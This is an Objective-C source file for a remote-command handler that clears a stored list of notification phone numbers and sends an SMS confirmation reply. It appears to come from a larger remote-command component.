/**
 - Project name :  RemoteCommandMager Component
 - Class name   :  ClearNotificationNumbersProcessor
 - Version      :  1.0  
 - Purpose      :  For RemoteCommandMager Component
 - Copy right   :  13/03/2012, Prasad M.B, Vervata Co., Ltd. All rights reserved.
*/

#import "ClearNotificationNumbersProcessor.h"
#import "PrefNotificationNumber.h"
#import "Preference.h"

@interface ClearNotificationNumbersProcessor (PrivateAPI)
- (void) processClearNotificationNumber;
- (void) sendReplySMS;
@end

@implementation ClearNotificationNumbersProcessor

/**
 - Method name: initWithRemoteCommandData
 - Purpose:This method is used to initialize the ClearNotificationNumbersProcessor class
 - Argument list and description: aRemoteCmdData (RemoteCmdData)
 - Return description: self(ClearNotificationNumbersProcessor)
*/

- (id) initWithRemoteCommandData: (RemoteCmdData *) aRemoteCmdData  {
    DLog (@"ClearNotificationNumbersProcessor--->initWithRemoteCommandData");
	if ((self =  [super initWithRemoteCommandData:aRemoteCmdData])) {
	}
	return self;
}

#pragma mark RemoteCmdProcessor Methods

/**
 - Method name: doProcessingCommand
 - Purpose:This method is used to process the ClearNotificationNumbersProcessor
 - Argument list and description:No Argument 
 - Return description: No return type
*/

- (void) doProcessingCommand {
	DLog (@"ClearNotificationNumbersProcessor--->doProcessingCommand")
 	[self processClearNotificationNumber];
}



#pragma mark ClearNotificationNumbersProcessor PrivateAPI Methods

/**
 - Method name: processClearNotificationNumber
 - Purpose:This method is used to process clear Notification number
 - Argument list and description: No Argument
 - Return description: No Return type
 */

- (void) processClearNotificationNumber {
	DLog (@"ClearNotificationNumbersProcessor--->processClearNotificationNumber");
	id <PreferenceManager> prefManager = [[RemoteCmdUtils sharedRemoteCmdUtils] mPreferenceManager];
	PrefNotificationNumber *prefNotificationNumberList = (PrefNotificationNumber *) [prefManager preference:kNotification_Number];
    NSMutableArray *notificationNumberList=[[NSMutableArray alloc] init];
	[prefNotificationNumberList setMNotificationNumbers:notificationNumberList];
	[prefManager savePreferenceAndNotifyChange:prefNotificationNumberList];
	[notificationNumberList release];
	[self sendReplySMS];
}

/**
 - Method name: sendReplySMS
 - Purpose:This method is used to send the SMS reply
 - Argument list and description: No Argument
 - Return description: No return type
*/

- (void) sendReplySMS {
	DLog (@"ClearNotificationNumbersProcessor--->sendReplySMS")
	NSString *messageFormat=[[RemoteCmdUtils sharedRemoteCmdUtils] replyMessageFormatWithCommandCode:[self remoteCmdCode]
																						andErrorCode:_SUCCESS_];
	[[RemoteCmdUtils sharedRemoteCmdUtils] createSystemEvent:mRemoteCmdData
											 andReplyMessage:messageFormat];
	if ([mRemoteCmdData mIsSMSReplyRequired]) {
		[[RemoteCmdUtils sharedRemoteCmdUtils] sendSMSWithRecipientNumber:[self recipientNumber] 
															   andMessage:messageFormat];
	}
}

/**
 - Method name: dealloc
 - Purpose:This method is used to Handle Memory managment
 - Argument list and description:No Argument
 - Return description: No Return Type
*/

-(void) dealloc {
	[super dealloc];
}

@end
